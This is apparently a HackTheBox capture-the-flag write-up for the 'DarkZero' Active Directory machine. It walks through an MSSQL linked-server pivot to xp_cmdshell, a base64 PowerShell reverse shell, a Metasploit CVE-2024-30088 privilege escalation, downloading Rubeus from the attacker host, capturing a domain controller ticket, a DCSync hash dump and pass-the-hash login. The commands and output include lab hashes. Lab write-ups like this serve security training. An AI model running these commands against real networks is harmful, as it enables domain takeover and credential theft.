DarkZero - HackTheBox

*Target Ip. Address: 10.129.21.48*

We are given the credentials.

```credentials
Username: john.w
Password: RFulUtONCOL!
```

This is a hard-rated Active Directory machine from HackTheBox. Let's kickstart with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.129.21.48
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 16:22 +0545
Nmap scan report for 10.129.21.48
Host is up (1.3s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-07 10:40:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.21.48:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.129.21.48:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-07T10:37:19
|_Not valid after:  2056-02-07T10:37:19
|_ssl-date: 2026-02-07T10:42:28+00:00; +3s from scanner time.
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-07T10:41:27
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 322.73 seconds
```

That's a whole lot of information. It consists of all basic Active Directory services.

Let's add Domain name and Computer name in our hosts file.

```bash
kali@kali:cat /etc/hosts                                                                                                                                       
10.129.21.48    darkzero.htb dc01.darkzero.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Since there are MSSQL and winrm service active. Let's see if we can use winrm to get a shell.

```bash
kali@kali:nxc winrm 10.129.21.48 -u 'john.w' -p 'RFulUtONCOL!'
WINRM       10.129.21.48    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.21.48    5985   DC01             [-] darkzero.htb\john.w:RFulUtONCOL!
```

No shell for us. Let's see if we have MSSQL access.

```bash
kali@kali:impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.129.21.48 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> 
```

We are logged in as guest into MSSQL.

```bash
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      
Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   
SQL (darkzero\john.w  guest@master)>
```

This is a significant find. We’ve identified a Linked Server pointing to an external domain: DC02.darkzero.ext.The most critical piece of information here is the mapping: DC02.darkzero.ext is configured to connect using the Remote Login credentials of dc01_sql_svc.In MS-SQL, linked servers allow us to execute commands on a remote instance. If that remote connection is established as a service account (dc01_sql_svc), any command you send across that link will execute with the permissions of that service account on the target (DC02).

```bash
SQL (darkzero\john.w  guest@master)> use_link [DC02.darkzero.ext]
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.                                        
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami 
output                 
--------------------   
darkzero-ext\svc_sql   
NULL                   
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> 
```

We have successfully achieved remote code execution on DC02.darkzero.ext as the service account darkzero-ext\svc_sql.

Now that we have RCE on an external domain controller, we need to determine if this instance can help us jump back to the primary darkzero.htb domain with higher privileges. Before that let's get ourselves a reverse shell.

Start a listener.

```bash
penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.11.65 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Execute the payload. I am selecting powershell base64 encoded payload.

```bash
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell "powershell -e JABjAG.....AGUAKAApAA=="
```

You should be receiving a reverse shell shortly.

```bash
penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.11.65 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from DC02~10.129.21.48-Microsoft_Windows_Server_2022_Datacenter-x64-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/DC02~10.129.21.48-Microsoft_Windows_Server_2022_Datacenter-x64-based_PC/2026_02_07-17_03_42-993.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Windows\system32> whoami
darkzero-ext\svc_sql
```

I've successfully bypassed the command length limitations and established a stable interactive PowerShell session on DC02 as darkzero-ext\svc_sql using the Penelope listener.

I was kind of getting stuck here. Running winpeas I found that it was using outdated kernel version and has critical vulnerability (CVE-2024-30088). It has a metasploit module as well, so we will have to switch to metasploit reverse shell.

```
msf exploit(windows/local/cve_2024_30088_authz_basep) > show options

Module options (exploit/windows/local/cve_2024_30088_authz_basep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64
```

```
View the full module info with the info, or info -d command.

msf exploit(windows/local/cve_2024_30088_authz_basep) > set LPORT 8390
LPORT => 8390
msf exploit(windows/local/cve_2024_30088_authz_basep) > set session 3
session => 3
msf exploit(windows/local/cve_2024_30088_authz_basep) > run
[*] Started reverse TCP handler on 10.10.16.34:8390 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Reflectively injecting the DLL into 3260...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 820
[+] Successfully retrieved winlogon pid: 604
[*] Sending stage (232006 bytes) to 10.129.21.48
[*] Meterpreter session 4 opened (10.10.16.34:8390 -> 10.129.21.48:53657) at 2026-02-16 08:53:46 +0545

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

I don't know how it worked, I tried multiple times, but eveytime the shell died, but this time it worked.

Just try multiple times, it will succeed.

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\user.txt
type C:\Users\Administrator\Desktop\user.txt
a3.....8b
```

Get the Rubeus on the machine, now we will try to intercept the ticket of DC01.

```
C:\Windows\system32>powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.34/Rubeus.exe','C:\Users\Public\Rubeus.exe')"
```

```
C:\Windows\system32>C:\Users\Public\Rubeus.exe monitor /interval:1 /nowrap
C:\Users\Public\Rubeus.exe monitor /interval:1 /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs


[*] 2/16/2026 3:15:04 AM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  2/16/2026 3:05:20 AM
  EndTime               :  2/16/2026 1:05:20 PM
  RenewTill             :  2/23/2026 3:05:20 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :
.
.
.
.
.
```

Run a command to connect DC01 to DC02, so that Rubeus running on DC02 will intercept and capture the DC01 ticket.

```
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\test
subdirectory   depth   file   
------------   -----   ----   

SQL (darkzero\john.w  guest@master)> 
```

Check on the Rubeus output.

```
[*] 2/16/2026 3:15:37 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  2/16/2026 3:15:36 AM
  EndTime               :  2/16/2026 1:15:36 PM
  RenewTill             :  2/23/2026 3:15:36 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIB.....xEQVJLWkVSTy5IVEI=

[*] Ticket cache size: 6
```

We got the DC01 ticket. We have to base64 decode, then convert the kirbi ticket to ccache.

```
echo "doIFjDCCBYigAwIB.....xEQVJLWkVSTy5IVEI=" > dc01_ticket.b64
```

```
cat dc01_ticket.b64 | base64 -d > dc01_ticket.kirbi
```

```
impacket-ticketConverter dc01_ticket.kirbi dc01_admin.ccache
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

We have an admin ccache, now we can use secretsdump to dump the admin hashes.

```
export KRB5CCNAME=$(pwd)/dc01_admin.ccache
```

```
impacket-secretsdump -k -no-pass -just-dc -target-ip 10.129.21.48 'darkzero.htb/DC01$@DC01.darkzero.htb'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:59.....26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
.
.
.
darkzero-ext$:aes256-cts-hmac-sha1-96:f9cab478b7073c5e5cb01619051d69ccee578e2c4c1fcb22d134f8d0f55fa6d9
darkzero-ext$:aes128-cts-hmac-sha1-96:d0a7edea3869a7a15ca7f866b3ba1722
darkzero-ext$:0x17:17db458bcf796074e34a4d0967b12af9
[*] Cleaning up..
```

Now, we can login as admin with the hash we got.

```
evil-winrm -i 10.129.21.48 -u administrator -H 59.....26                                                       
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

We can see there is both user and root flag, in case user flag is missed at DC02.

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         2/16/2026   2:24 AM             34 root.txt
-ar---         2/16/2026   2:24 AM             34 user.txt
```

Let's read the final flag and end this challenge.

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
21e8d3a514a27a4d3e3238960f25f19a
```
